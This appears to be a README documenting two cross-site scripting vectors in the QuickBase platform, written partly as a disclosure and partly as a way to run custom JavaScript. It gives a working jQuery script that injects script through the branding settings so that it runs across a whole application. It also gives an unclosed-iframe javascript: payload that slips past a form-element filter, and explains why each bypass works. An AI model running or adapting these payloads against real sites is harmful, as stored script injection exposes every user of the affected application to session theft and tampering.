# QuickBase XSS
This repository documents XSS injection vectors I've discovered in the QuickBase platform (http://www.quickbase.com).

## Branding Page Injection
This one requires admin privileges, so it isn't a major vulnerability. Why, then, is it interesting? *It allows arbitrary code to run application wide!*

##### How does it work?
Run the JavaScript below in your developer console while on the dashboard of the application you want to affect. It will issue a POST to the SaveAppSettingsBrandGuide action.

```javascript
var DBID = "";
var REALM = "";
var SCRIPT = "alert('HELLO!');";
var TOKEN = $("[name=PageToken]").val();

$.ajax({
  url: "https://" + REALM + ".quickbase.com/db/" + DBID + "?a=SaveAppSettingsBrandGuide",
  type: "POST",
  data: {
    uiCustomTextColor: "</style><script>" + SCRIPT + "</script><style>",
    PageToken: TOKEN,
    CustomHeader: "on",
    uiCustomHeaderOptions: "iBasic",
    apply: "Save"
  }
});
```

##### Why does it work?
QuickBase engineers only sanitized input client side on a value that gets inserted into every page in the application. Doh!

## Form Text Element Injection
Need to run some custom JavaScript on a particular QuickBase form? No problem!

##### How does it work?
Paste the snippet below into a QuickBase form text element and you're all set.

```html
<iframe src="javascript: alert('HELLO!')" style="display: none"
```

##### Why does it work?
This one works for a couple of reasons:
- Omitting the closing tag on the iframe element allows us to skirt the regex that QuickBase is presumably using to filter out unwanted text. 
- Modern day rendering engines make an attempt to fix mistakes like unclosed tags.
